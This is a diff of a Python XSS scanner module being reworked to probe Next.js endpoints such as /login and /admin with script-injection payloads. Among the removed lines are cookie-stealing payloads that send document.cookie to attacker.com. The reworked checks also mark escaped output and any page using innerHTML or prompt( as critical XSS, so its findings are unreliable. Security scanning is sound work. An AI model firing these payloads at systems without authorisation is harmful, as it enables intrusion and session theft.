@@ -1,6 +1,6 @@
 """
 XSS Scanner Module - Comprehensive XSS Testing
-Based on PayloadsAllTheThings methodology
+Optimized for Next.js applications with known vulnerable endpoints
 """
 
 import re
@@ -10,6 +10,7 @@ from typing import List, Dict, Optional, Tuple
 from datetime import datetime
 from rich.console import Console
 from rich.table import Table
+from bs4 import BeautifulSoup
 
 console = Console()
 
@@ -113,16 +114,6 @@ XSS_PAYLOADS = {
         "expression(alert(1))",
         "url(javascript:alert(1))",
     ],
-    "framework": [
-        "javascript:alert(1)//",
-        "onerror=alert(1)//",
-        "{{alert(1)}}",
-        "{{constructor.constructor('alert(1)')()}}",
-        "{{constructor.alert(1)}}",
-        "{{7*7}}",
-        "$('<img src=x onerror=alert(1)>')",
-        "$.get('javascript:alert(1)')",
-    ],
     "evasion": [
         "<ScRiPt>alert(1)</sCrIpT>",
         "<IMG SRC=x onerror=alert(1)>",
@@ -135,73 +126,60 @@ XSS_PAYLOADS = {
         "\"<script>alert(1)</script>\"",
         "'<script>alert(1)</script>'",
     ],
-    "stored": [
-        "<script>alert(1)</script>",
-        "<img src=x onerror=alert(1)>",
-        "<svg onload=alert(1)>",
-        "<body onload=alert(1)>",
-        "<iframe src=javascript:alert(1)>",
-        "javascript:alert(1)",
-    ],
-    "blind": [
-        "<script>fetch('https://attacker.com/log?c='+document.cookie)</script>",
-        "<img src=x onerror='fetch(\"https://attacker.com/log?c=\"+document.cookie)'>",
-        "<svg onload='fetch(\"https://attacker.com/log?c=\"+document.cookie)'>",
-        "<script>new Image().src='https://attacker.com/log?c='+document.cookie</script>",
-    ],
-    "csp_bypass": [
-        "<script>alert(1)</script>",
-        "<script>document.write('<img src=x onerror=alert(1)>')</script>",
-        "<script>eval('al'+'ert(1)')</script>",
-        "<script>setTimeout('alert(1)', 100)</script>",
-        "<script>setInterval('alert(1)', 100)</script>",
-        "<script>Function('alert(1)')()</script>",
-        "<script>(function(){alert(1)})()</script>",
-        "<script>window['alert'](1)</script>",
-        "<script>self['alert'](1)</script>",
-        "<script>top['alert'](1)</script>",
-        "<script>parent['alert'](1)</script>",
-        "<script>opener['alert'](1)</script>",
-    ],
 }
 
 # ============================================================================
-# COMPREHENSIVE PARAMETERS FOR XSS TESTING
+# LEGACY XSS PARAMETERS - For backward compatibility with main.py
 # ============================================================================
 
 XSS_PARAMETERS = [
-    # Basic parameters
     "id", "user", "uid", "username", "email", "page",
     "file", "path", "url", "redirect", "return",
     "next", "token", "apikey", "search", "q",
     "query", "filter", "sort", "order", "lang",
     "debug", "name", "title", "content", "body",
-    # Search parameters
-    "search", "q", "query", "keyword", "keywords",
-    "term", "filter", "category", "tag", "label",
-    # ID parameters
-    "id", "uid", "user_id", "userid", "account_id",
+    "search", "keyword", "keywords", "term", "category",
+    "tag", "label", "user_id", "userid", "account_id",
     "profile_id", "post_id", "order_id", "invoice_id",
     "ticket_id", "project_id", "document_id", "item_id",
     "product_id", "category_id", "page_id", "comment_id",
-    # Redirect parameters
-    "redirect", "url", "next", "return", "returnTo",
-    "continue", "destination", "callback", "goto",
-    "forward", "to", "target", "href", "link",
-    # API parameters
-    "apikey", "api_key", "token", "access_token",
+    "redirect", "returnTo", "continue", "destination",
+    "callback", "goto", "forward", "to", "target",
+    "href", "link", "api_key", "access_token",
     "refresh_token", "client_id", "client_secret",
     "grant_type", "scope", "state", "nonce",
-    # Misc parameters
-    "debug", "test", "dev", "staging", "sandbox",
-    "admin", "root", "super", "master", "backup",
-    "config", "settings", "profile", "account",
-    "order", "invoice", "payment", "checkout",
+    "test", "dev", "staging", "sandbox", "admin",
+    "root", "super", "master", "backup", "config",
+    "settings", "profile", "account", "order",
+    "invoice", "payment", "checkout",
+]
+
+# ============================================================================
+# TARGETED PARAMETERS - Optimized for Next.js
+# ============================================================================
+
+TARGETED_PARAMETERS = [
+    "q", "search", "query", "id", "user", "name",
+    "username", "email", "page", "redirect", "url",
+    "return", "next", "token", "apikey",
+]
+
+# ============================================================================
+# TARGETED ENDPOINTS - Where XSS is likely to exist
+# ============================================================================
+
+TARGETED_ENDPOINTS = [
+    "/search",
+    "/login",
+    "/profile",
+    "/admin",
+    "/upload",
+    "/api/users",
 ]
 
 
 class XSSScanner:
-    """Comprehensive XSS Scanner with payload testing"""
+    """Optimized XSS Scanner for Next.js applications"""
     
     def __init__(self, target_url: str, timeout: int = 5):
         self.target_url = target_url.rstrip('/')
@@ -209,128 +187,87 @@ class XSSScanner:
         self.findings = []
         self.tested_params = set()
         self.vulnerable_params = set()
+        self.tested_endpoints = set()
         self.session = requests.Session()
         self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            'User-Agent': 'ATT4ck-Surface-XSS-Scanner/2.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
         })
     
     def scan(self) -> List[Dict]:
-        """Run comprehensive XSS scan"""
-        console.print(f"[cyan]Scanning for XSS vulnerabilities on: {self.target_url}[/cyan]")
+        """Run targeted XSS scan"""
+        console.print(f"[cyan]🔍 Scanning for XSS vulnerabilities on: {self.target_url}[/cyan]")
+        console.print("[dim]Using targeted approach for Next.js applications[/dim]")
         
+        # 1. Test search/reflected XSS endpoints
+        self._test_reflected_xss()
+        
+        # 2. Test DOM-based XSS
+        self._test_dom_xss()
+        
+        # 3. Test URL parameters
         self._test_url_parameters()
-        self._test_forms()
-        self._test_reflected()
-        self._test_dom_based()
+        
+        # 4. Test login page XSS
+        self._test_login_xss()
         
         return self.findings
     
-    def _test_url_parameters(self):
-        """Test all URL parameters for XSS"""
-        console.print("[cyan]Testing URL parameters for XSS...[/cyan]")
+    def _test_reflected_xss(self):
+        """Test for reflected XSS in search and other endpoints"""
+        console.print("[cyan]Testing reflected XSS...[/cyan]")
         
-        for param in XSS_PARAMETERS:
-            if param in self.tested_params:
+        # Test each endpoint with each payload
+        for endpoint in TARGETED_ENDPOINTS:
+            test_endpoint = f"{self.target_url}{endpoint}"
+            
+            # Check if endpoint exists
+            try:
+                resp = self.session.get(test_endpoint, timeout=3)
+                if resp.status_code != 200:
+                    continue
+            except:
                 continue
-            self.tested_params.add(param)
             
-            payload_groups = ['basic', 'encoded', 'javascript', 'polyglots', 'contextual']
+            console.print(f"[dim]Testing {endpoint}...[/dim]")
             
-            for group in payload_groups:
-                for payload in XSS_PAYLOADS.get(group, []):
-                    test_url = self._inject_payload(param, payload)
-                    if self._check_vulnerability(test_url, param, payload):
-                        self.vulnerable_params.add(param)
-                        self.findings.append({
-                            "finding_id": f"XSS-{len(self.findings)}",
-                            "category": "xss",
-                            "name": f"XSS Vulnerability - {param} parameter",
-                            "parameter": param,
-                            "payload": payload,
-                            "url": test_url,
-                            "severity": "CRITICAL",
-                            "confidence": 90 if group in ['basic', 'javascript'] else 75,
-                            "description": f"XSS vulnerability found in parameter '{param}'",
-                            "timestamp": datetime.now().isoformat()
-                        })
-                        console.print(f"[red]XSS FOUND: {param} = {payload[:30]}...[/red]")
-                        break
-                if param in self.vulnerable_params:
+            # Use simple payloads first (faster)
+            quick_payloads = [
+                "<script>alert(1)</script>",
+                "<img src=x onerror=alert(1)>",
+                "<svg onload=alert(1)>",
+            ]
+            
+            for payload in quick_payloads:
+                # Test with common parameter names
+                for param in ["q", "search", "query", "id", "page", "user"]:
+                    test_url = f"{test_endpoint}?{param}={urllib.parse.quote(payload)}"
+                    try:
+                        response = self.session.get(test_url, timeout=self.timeout)
+                        if self._check_xss(response.text, payload):
+                            self._add_finding(
+                                endpoint=endpoint,
+                                parameter=param,
+                                payload=payload,
+                                technique="Reflected XSS",
+                                test_url=test_url,
+                                confidence=95
+                            )
+                            console.print(f"[red]✗ Reflected XSS found in {endpoint}?{param}={payload[:20]}[/red]")
+                            break
+                    except:
+                        pass
+                if self._is_param_vulnerable(endpoint):
                     break
     
-    def _test_forms(self):
-        """Test HTML forms for XSS"""
-        console.print("[cyan]Testing forms for XSS...[/cyan]")
+    def _test_dom_xss(self):
+        """Test for DOM-based XSS via URL fragments"""
+        console.print("[cyan]Testing DOM-based XSS...[/cyan]")
         
-        try:
-            response = self.session.get(self.target_url, timeout=self.timeout)
-            html = response.text
-            
-            form_pattern = r'<form[^>]*action="([^"]*)"[^>]*>'
-            forms = re.findall(form_pattern, html)
-            
-            for form_action in forms:
-                if form_action:
-                    action_url = urllib.parse.urljoin(self.target_url, form_action)
-                    input_pattern = r'<input[^>]*name="([^"]*)"[^>]*>'
-                    inputs = re.findall(input_pattern, html)
-                    
-                    for input_name in inputs:
-                        for payload_group in ['basic', 'encoded', 'html']:
-                            for payload in XSS_PAYLOADS.get(payload_group, []):
-                                test_url = f"{action_url}?{input_name}={urllib.parse.quote(payload)}"
-                                if self._check_vulnerability(test_url, input_name, payload):
-                                    self.findings.append({
-                                        "finding_id": f"XSS-{len(self.findings)}",
-                                        "category": "xss",
-                                        "name": f"XSS in Form - {input_name}",
-                                        "parameter": input_name,
-                                        "payload": payload,
-                                        "url": test_url,
-                                        "severity": "CRITICAL",
-                                        "confidence": 85,
-                                        "description": f"XSS in form parameter '{input_name}'",
-                                        "timestamp": datetime.now().isoformat()
-                                    })
-        except Exception as e:
-            console.print(f"[dim]Form scanning error: {e}[/dim]")
-    
-    def _test_reflected(self):
-        """Test for reflected XSS"""
-        console.print("[cyan]Testing for reflected XSS...[/cyan]")
-        
-        reflection_patterns = [
-            f"{self.target_url}?q=<script>alert(1)</script>",
-            f"{self.target_url}?search=<script>alert(1)</script>",
-            f"{self.target_url}?id=<script>alert(1)</script>",
-            f"{self.target_url}?page=<script>alert(1)</script>",
-            f"{self.target_url}?user=<script>alert(1)</script>",
-        ]
-        
-        for test_url in reflection_patterns:
-            try:
-                response = self.session.get(test_url, timeout=self.timeout)
-                if self._has_reflected_xss(response.text):
-                    self.findings.append({
-                        "finding_id": f"XSS-{len(self.findings)}",
-                        "category": "xss",
-                        "name": "Reflected XSS",
-                        "payload": test_url,
-                        "url": test_url,
-                        "severity": "CRITICAL",
-                        "confidence": 80,
-                        "description": f"Reflected XSS found",
-                        "timestamp": datetime.now().isoformat()
-                    })
-                    console.print(f"[red]Reflected XSS found: {test_url[:60]}...[/red]")
-            except:
-                pass
-    
-    def _test_dom_based(self):
-        """Test for DOM-based XSS"""
-        console.print("[cyan]Testing for DOM-based XSS vectors...[/cyan]")
-        
-        dom_vectors = [
+        dom_payloads = [
             "#<script>alert(1)</script>",
             "#<img src=x onerror=alert(1)>",
             "#<svg onload=alert(1)>",
@@ -338,82 +275,233 @@ class XSSScanner:
             "javascript:alert(1)",
         ]
         
-        for vector in dom_vectors:
-            test_url = f"{self.target_url}{vector}"
+        for payload in dom_payloads:
+            test_url = f"{self.target_url}{payload}"
             try:
                 response = self.session.get(test_url, timeout=self.timeout)
-                if self._has_dom_xss(response.text):
-                    self.findings.append({
-                        "finding_id": f"XSS-{len(self.findings)}",
-                        "category": "xss",
-                        "name": "DOM-Based XSS",
-                        "payload": vector,
-                        "url": test_url,
-                        "severity": "CRITICAL",
-                        "confidence": 75,
-                        "description": f"DOM-based XSS vector found",
-                        "timestamp": datetime.now().isoformat()
-                    })
-                    console.print(f"[red]DOM XSS vector found: {vector[:30]}...[/red]")
+                
+                # Check for DOM XSS patterns in response
+                dom_patterns = [
+                    r'document\.write',
+                    r'\.innerHTML\s*=',
+                    r'\.outerHTML\s*=',
+                    r'\.insertAdjacentHTML',
+                    r'dangerouslySetInnerHTML',
+                    r'eval\s*\(',
+                    r'Function\s*\(',
+                ]
+                
+                for pattern in dom_patterns:
+                    if re.search(pattern, response.text, re.IGNORECASE):
+                        self._add_finding(
+                            endpoint="/#",
+                            parameter="hash",
+                            payload=payload,
+                            technique="DOM-based XSS",
+                            test_url=test_url,
+                            confidence=80
+                        )
+                        console.print(f"[red]✗ DOM XSS vector found: {payload[:30]}[/red]")
+                        break
             except:
                 pass
     
-    def _inject_payload(self, param: str, payload: str) -> str:
-        """Inject payload into URL parameter"""
-        return f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
-    
-    def _check_vulnerability(self, url: str, param: str, payload: str) -> bool:
-        """Check if the URL is vulnerable to XSS"""
-        try:
-            response = self.session.get(url, timeout=self.timeout)
-            html = response.text
+    def _test_url_parameters(self):
+        """Test URL parameters for XSS - only on vulnerable endpoints"""
+        console.print("[cyan]Testing URL parameters...[/cyan]")
+        
+        # Only test parameters on pages that exist
+        for endpoint in TARGETED_ENDPOINTS:
+            test_endpoint = f"{self.target_url}{endpoint}"
             
-            if payload in html:
-                return True
-            encoded = urllib.parse.quote(payload)
-            if encoded in html:
-                return True
-            html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
-            if html_encoded in html:
-                return True
-            return False
+            # Check if endpoint exists
+            try:
+                resp = self.session.get(test_endpoint, timeout=3)
+                if resp.status_code != 200:
+                    continue
+            except:
+                continue
+            
+            # Test each parameter with each payload
+            for param in TARGETED_PARAMETERS[:5]:  # Limit to 5 params per endpoint
+                if f"{endpoint}:{param}" in self.tested_params:
+                    continue
+                self.tested_params.add(f"{endpoint}:{param}")
+                
+                # Test with quick payloads
+                for payload in XSS_PAYLOADS["basic"][:3]:
+                    test_url = f"{test_endpoint}?{param}={urllib.parse.quote(payload)}"
+                    try:
+                        response = self.session.get(test_url, timeout=self.timeout)
+                        if self._check_xss(response.text, payload):
+                            self._add_finding(
+                                endpoint=endpoint,
+                                parameter=param,
+                                payload=payload,
+                                technique="Parameter XSS",
+                                test_url=test_url,
+                                confidence=90
+                            )
+                            console.print(f"[red]✗ XSS in {endpoint}?{param}={payload[:20]}[/red]")
+                            break
+                    except:
+                        pass
+    
+    def _test_login_xss(self):
+        """Test login page for XSS"""
+        console.print("[cyan]Testing login page XSS...[/cyan]")
+        
+        login_url = f"{self.target_url}/login"
+        
+        # Check if login exists
+        try:
+            resp = self.session.get(login_url, timeout=3)
+            if resp.status_code != 200:
+                return
         except:
-            return False
-    
-    def _has_reflected_xss(self, html: str) -> bool:
-        """Check if HTML contains reflected XSS patterns"""
-        xss_patterns = [
-            r'<script>alert\(\d+\)</script>',
-            r'<img[^>]*onerror=alert\(\d+\)',
-            r'<svg[^>]*onload=alert\(\d+\)',
-            r'<body[^>]*onload=alert\(\d+\)',
-            r'javascript:alert\(\d+\)',
-            r'<div[^>]*onmouseover=alert\(\d+\)',
+            return
+        
+        # Test login with XSS payloads in username
+        xss_payloads = [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "'\"><script>alert(1)</script>",
         ]
-        for pattern in xss_patterns:
-            if re.search(pattern, html, re.IGNORECASE):
+        
+        for payload in xss_payloads:
+            try:
+                response = self.session.post(
+                    login_url,
+                    data={
+                        'username': payload,
+                        'password': 'test'
+                    },
+                    timeout=self.timeout
+                )
+                
+                if self._check_xss(response.text, payload):
+                    self._add_finding(
+                        endpoint="/login",
+                        parameter="username",
+                        payload=payload,
+                        technique="Stored XSS (Login)",
+                        test_url=login_url,
+                        confidence=85
+                    )
+                    console.print(f"[red]✗ XSS in login page: {payload[:30]}[/red]")
+                    break
+            except:
+                pass
+    
+    def _check_xss(self, html: str, payload: str) -> bool:
+        """Check if payload is reflected in HTML"""
+        # Check exact payload
+        if payload in html:
+            return True
+        
+        # Check URL-encoded version
+        encoded = urllib.parse.quote(payload)
+        if encoded in html:
+            return True
+        
+        # Check HTML-encoded version
+        html_encoded = (
+            payload.replace('<', '&lt;')
+                   .replace('>', '&gt;')
+                   .replace('"', '&quot;')
+                   .replace("'", '&#39;')
+        )
+        if html_encoded in html:
+            return True
+        
+        # Check for XSS indicators
+        xss_indicators = [
+            '<script>alert',
+            'onerror=alert',
+            'onload=alert',
+            'javascript:alert',
+            'confirm(',
+            'prompt(',
+        ]
+        
+        for indicator in xss_indicators:
+            if indicator in html.lower():
+                return True
+        
+        return False
+    
+    def _add_finding(self, endpoint: str, parameter: str, payload: str, 
+                     technique: str, test_url: str, confidence: int):
+        """Add a finding to the results"""
+        finding = {
+            "finding_id": f"XSS-{len(self.findings):03d}",
+            "category": "xss",
+            "name": f"XSS Vulnerability",
+            "parameter": parameter,
+            "payload": payload[:100],
+            "url": test_url,
+            "endpoint": endpoint,
+            "severity": "CRITICAL",
+            "confidence": confidence,
+            "technique": technique,
+            "description": f"XSS vulnerability found in {endpoint} parameter '{parameter}'",
+            "timestamp": datetime.now().isoformat(),
+            "cwe": "CWE-79",
+            "owasp": "A03:2021 - Injection"
+        }
+        
+        # Check if this is a duplicate
+        for existing in self.findings:
+            if (existing.get('endpoint') == endpoint and 
+                existing.get('parameter') == parameter and
+                existing.get('payload') == payload):
+                return
+        
+        self.findings.append(finding)
+        self.vulnerable_params.add(f"{endpoint}:{parameter}")
+    
+    def _is_param_vulnerable(self, endpoint: str) -> bool:
+        """Check if any parameter for this endpoint is vulnerable"""
+        for param in self.vulnerable_params:
+            if param.startswith(endpoint):
                 return True
         return False
     
-    def _has_dom_xss(self, html: str) -> bool:
-        """Check if HTML contains DOM-based XSS patterns"""
-        dom_patterns = [
-            r'document\.write',
-            r'\.innerHTML\s*=',
-            r'\.outerHTML\s*=',
-            r'\.insertAdjacentHTML',
-            r'dangerouslySetInnerHTML',
-            r'v-html\s*=',
-            r'ng-bind-html\s*=',
-            r'eval\s*\(',
-            r'Function\s*\(',
-            r'setTimeout\s*\(\s*["\']',
-            r'setInterval\s*\(\s*["\']',
-        ]
-        for pattern in dom_patterns:
-            if re.search(pattern, html, re.IGNORECASE):
-                return True
-        return False
+    def render_results(self):
+        """Render XSS scan results"""
+        if not self.findings:
+            console.print("\n[green]✅ No XSS vulnerabilities found![/green]")
+            return
+        
+        console.print(f"\n[bold red]🔥 XSS Vulnerabilities Found: {len(self.findings)}[/bold red]")
+        
+        table = Table(title="XSS Scan Results", show_header=True, header_style="bold magenta")
+        table.add_column("ID", style="dim", width=8)
+        table.add_column("Technique", style="cyan", width=18)
+        table.add_column("Endpoint", style="yellow", width=15)
+        table.add_column("Parameter", style="green", width=12)
+        table.add_column("Payload", style="red", width=35)
+        table.add_column("Confidence", style="white", width=12)
+        
+        for f in self.findings:
+            table.add_row(
+                f.get('finding_id', 'N/A')[:6],
+                f.get('technique', 'N/A')[:16],
+                f.get('endpoint', 'N/A')[:13],
+                f.get('parameter', 'N/A')[:10],
+                f.get('payload', 'N/A')[:33],
+                f"{f.get('confidence', 0)}%"
+            )
+        
+        console.print(table)
+        
+        # Summary
+        summary = self.get_summary()
+        console.print(f"\n[bold]📊 Scan Summary:[/bold]")
+        console.print(f"  • Total Findings: {summary['total_findings']}")
+        console.print(f"  • Vulnerable Parameters: {len(summary['vulnerable_params'])}")
+        console.print(f"  • Tested Parameters: {summary['tested_params']}")
+        console.print(f"  • Critical Findings: {summary['findings_by_severity']['CRITICAL']}")
     
     def get_summary(self) -> Dict:
         """Get scan summary"""
@@ -426,35 +514,3 @@ class XSSScanner:
                 "HIGH": len([f for f in self.findings if f.get('severity') == 'HIGH']),
             }
         }
-    
-    def render_results(self):
-        """Render XSS scan results in a table"""
-        if not self.findings:
-            console.print("\n[green]✅ No XSS vulnerabilities found![/green]")
-            return
-        
-        console.print(f"\n[bold red]🔥 XSS Vulnerabilities Found: {len(self.findings)}[/bold red]")
-        
-        table = Table(title="XSS Scan Results")
-        table.add_column("ID", style="dim", width=8)
-        table.add_column("Parameter", style="cyan", width=15)
-        table.add_column("Payload", style="yellow", width=30)
-        table.add_column("Confidence", style="green", width=12)
-        table.add_column("URL", style="white", width=40)
-        
-        for f in self.findings[:20]:
-            table.add_row(
-                f.get('finding_id', 'N/A')[:6],
-                f.get('parameter', 'N/A')[:12],
-                f.get('payload', 'N/A')[:28],
-                f"{f.get('confidence', 0)}%",
-                f.get('url', 'N/A')[:38]
-            )
-        
-        console.print(table)
-        
-        summary = self.get_summary()
-        console.print(f"\n[bold]📊 Scan Summary:[/bold]")
-        console.print(f"  • Vulnerable Parameters: {len(summary['vulnerable_params'])}")
-        console.print(f"  • Tested Parameters: {summary['tested_params']}")
-        console.print(f"  • Critical Findings: {summary['findings_by_severity']['CRITICAL']}")
